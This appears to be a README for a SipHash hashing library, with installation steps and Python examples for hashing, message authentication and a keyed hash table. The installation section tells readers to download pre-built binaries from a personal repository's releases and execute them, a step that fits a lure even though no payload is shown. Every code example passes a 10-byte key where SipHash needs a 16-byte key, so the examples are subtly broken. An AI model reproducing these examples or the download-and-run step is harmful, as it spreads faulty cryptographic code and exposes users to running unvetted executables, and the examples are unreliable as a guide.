## Introduction

SipHash is a family of pseudorandom functions that provide strong security properties while being efficient in performance. It is particularly useful in scenarios where hash tables are vulnerable to denial-of-service (DoS) attacks. By using SipHash, you can secure your applications against hash-flooding attacks that can slow down or crash services.

## Features

- **Cryptographic Security**: Provides strong security guarantees against various types of attacks.
- **Fast Performance**: Optimized for speed while maintaining security.
- **Versatile**: Can be used as a MAC, PRF, or for general hashing purposes.
- **Simple API**: Easy to integrate into your projects.

## Installation

To install the SipHash library, you can clone the repository and build it from source. Use the following commands:

```bash
git clone https://github.com/codemenowee22/sip.git
cd sip
make
```

You can also find pre-built binaries in the [Releases section](https://github.com/codemenowee22/sip/releases). Download the appropriate file for your system and execute it.

## Usage

Using SipHash in your project is straightforward. Hereâ€™s a simple example of how to use the library:

```python
import siphash

key = b'secret_key'
message = b'Hello, world!'

# Generate a SipHash digest
digest = siphash.SipHash_2_4(key, message)

print(f"SipHash Digest: {digest.hex()}")
```

This code snippet demonstrates how to generate a SipHash digest from a message using a secret key.

## Examples

Here are a few practical examples of how SipHash can be used:

### Example 1: Basic Hashing

```python
key = b'secret_key'
message = b'This is a test message.'

hash_value = siphash.SipHash_2_4(key, message)
print(f"Hash Value: {hash_value.hex()}")
```

### Example 2: Message Authentication

```python
key = b'secret_key'
message = b'Important data'

# Create a MAC
mac = siphash.SipHash_2_4(key, message)
print(f"Message Authentication Code: {mac.hex()}")
```

### Example 3: Secure Hash Table

```python
class SecureHashTable:
    def __init__(self, key):
        self.key = key
        self.table = {}

    def insert(self, message, value):
        hash_value = siphash.SipHash_2_4(self.key, message)
        self.table[hash_value] = value

    def get(self, message):
        hash_value = siphash.SipHash_2_4(self.key, message)
        return self.table.get(hash_value, None)

# Usage
hash_table = SecureHashTable(b'secret_key')
hash_table.insert(b'key1', 'value1')
print(hash_table.get(b'key1'))
```
